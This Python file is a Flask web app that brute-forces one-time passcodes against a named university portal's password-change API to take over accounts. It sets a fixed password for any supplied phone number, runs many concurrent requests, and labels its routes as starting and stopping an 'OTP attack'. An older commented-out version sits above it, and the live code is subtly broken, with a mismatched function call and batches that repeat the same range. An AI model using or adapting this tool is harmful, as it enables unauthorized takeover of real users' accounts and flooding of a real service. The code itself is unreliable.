#     socketio.run(app, debug=True, port=5000)

# import eventlet
# eventlet.monkey_patch()  # MUST be first

# from flask import Flask, render_template, request, jsonify
# from flask_socketio import SocketIO, emit
# import asyncio
# import aiohttp

# app = Flask(__name__)
# app.config['SECRET_KEY'] = 'secret!'
# socketio = SocketIO(app, async_mode='eventlet')

# API_URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
# COOKIE = "amplitude_iddigiicampus.com=YOUR_COOKIE_HERE"

# START_OTP = 100000
# MAX_RETRIES = 999999
# CONCURRENT_REQUESTS = 200

# # Async OTP function
# async def try_otp(session, phone, new_password, otp, stop_flag):
#     if stop_flag['stop']:
#         return None

#     payload = {"phone": phone, "otp": str(otp), "newPassword": new_password}
#     headers = {"Content-Type": "application/json", "Cookie": COOKIE}

#     try:
#         async with session.put(API_URL, json=payload, headers=headers) as resp:
#             text = await resp.text()

#             # Send live update to browser
#             socketio.emit('log', {'otp': otp, 'response': text})

#             if not text.strip():
#                 stop_flag['stop'] = True
#                 socketio.emit('finished', {'status':'success','otp_used':otp,'message':'Password changed successfully!'})
#                 return {"status":"success","otp_used":otp,"message":"Password changed successfully!","response":text}

#             data_resp = await resp.json()
#             if data_resp.get("message") == "Invalid request, Otp already used":
#                 stop_flag['stop'] = True
#                 socketio.emit('finished', {'status':'stopped','otp_used':otp,'message':data_resp["message"]})
#                 return {"status":"stopped","otp_used":otp,"message":data_resp["message"],"response":data_resp}
#     except Exception as e:
#         socketio.emit('log', {'otp': otp, 'response': f'Error: {str(e)}'})
#     return None

# # Background OTP runner
# def start_otp_background(phone, new_password):
#     async def runner():
#         stop_flag = {'stop': False}
#         connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS)
#         async with aiohttp.ClientSession(connector=connector) as session:
#             for batch_start in range(START_OTP, START_OTP + MAX_RETRIES, CONCURRENT_REQUESTS):
#                 if stop_flag['stop']:
#                     break
#                 tasks = [asyncio.create_task(try_otp(session, phone, new_password, otp, stop_flag))
#                          for otp in range(batch_start, min(batch_start + CONCURRENT_REQUESTS, START_OTP + MAX_RETRIES))]
#                 results = await asyncio.gather(*tasks)
#                 for res in results:
#                     if res:
#                         return res
#     # Spawn in eventlet
#     eventlet.spawn(asyncio.run, runner())

# # Routes
# @app.route('/')
# def index():
#     return render_template('index.html')  # live table + auto-scroll

# @app.route('/change_password_async', methods=['GET'])
# def change_password_async():
#     phone = request.args.get("phone")
#     new_password = request.args.get("newPassword")

#     if not phone or not new_password:
#         return jsonify({"status":"error","message":"phone and newPassword are required"}), 400

#     start_otp_background(phone, new_password)
#     return jsonify({"status":"started","message":"OTP process started!"}), 200

# # Run server
# if __name__ == "__main__":
#     socketio.run(app, debug=True, port=5000)



import eventlet
eventlet.monkey_patch()  # MUST be first

from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
import asyncio
import aiohttp

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet')

# Default settings
API_URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
DEFAULT_COOKIE = "amplitude_iddigiicampus.com=YOUR_COOKIE_HERE"
DEFAULT_START = 100000
DEFAULT_MAX = 999999
DEFAULT_CONCURRENT = 50
FIXED_PASSWORD = "Sitare@09099"

# Store stop flags per client
stop_flags = {}

# Async OTP function
async def try_otp(session, phone, start, otp, stop_flag, cookie):
    if stop_flag['stop']:
        return None

    payload = {"phone": phone, "otp": str(otp), "newPassword": FIXED_PASSWORD}
    headers = {"Content-Type": "application/json", "Cookie": cookie}

    try:
        async with session.put(API_URL, json=payload, headers=headers) as resp:
            text = await resp.text()

            if not text.strip():
                stop_flag['stop'] = True
                socketio.emit('finished', {'status':'success','otp_used':otp,'message':'Password changed successfully!'})
                return {"status":"success","otp_used":otp,"response":text}

            try:
                data_resp = await resp.json()
                if data_resp.get("message") == "Invalid request, Otp already used":
                    stop_flag['stop'] = True
                    socketio.emit('finished', {'status':'stopped','otp_used':otp,'message':data_resp["message"]})
                    return {"status":"stopped","otp_used":otp,"response":data_resp}
            except:
                pass

            socketio.emit('log', {'otp': otp, 'status': 'attempted', 'response': text})
    except Exception as e:
        socketio.emit('log', {'otp': otp, 'status': 'failed', 'response': str(e)})

    return None

# Background OTP runner
def start_otp_background(sid, phone, start, max_otp, concurrent, cookie):
    async def runner():
        stop_flag = stop_flags[sid]
        connector = aiohttp.TCPConnector(limit=concurrent)
        async with aiohttp.ClientSession(connector=connector) as session:
            for batch_start in range(start, max_otp + 1, concurrent):
                if stop_flag['stop']:
                    break
                tasks = [asyncio.create_task(try_otp(session, phone, start + i, stop_flag, cookie))
                         for i in range(concurrent)]
                await asyncio.gather(*tasks)
    eventlet.spawn(asyncio.run, runner())

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_attack():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'status':'error','message':'Phone number required'}), 400

    start = int(data.get('start') or DEFAULT_START)
    max_otp = int(data.get('max') or DEFAULT_MAX)
    concurrent = int(data.get('concurrent') or DEFAULT_CONCURRENT)
    cookie = data.get('cookie') or DEFAULT_COOKIE

    sid = request.sid if hasattr(request, 'sid') else 'default'
    stop_flags[sid] = {'stop': False}

    start_otp_background(sid, phone, start, max_otp, concurrent, cookie)
    return jsonify({'status':'started','message':'OTP attack started!'})

@app.route('/stop', methods=['POST'])
def stop_attack():
    sid = request.sid if hasattr(request, 'sid') else 'default'
    if sid in stop_flags:
        stop_flags[sid]['stop'] = True
        return jsonify({'status':'stopped','message':'OTP attack stopped!'})
    return jsonify({'status':'error','message':'No active attack'}), 400

# Run server
if __name__ == "__main__":
    socketio.run(app, debug=True, port=5000)
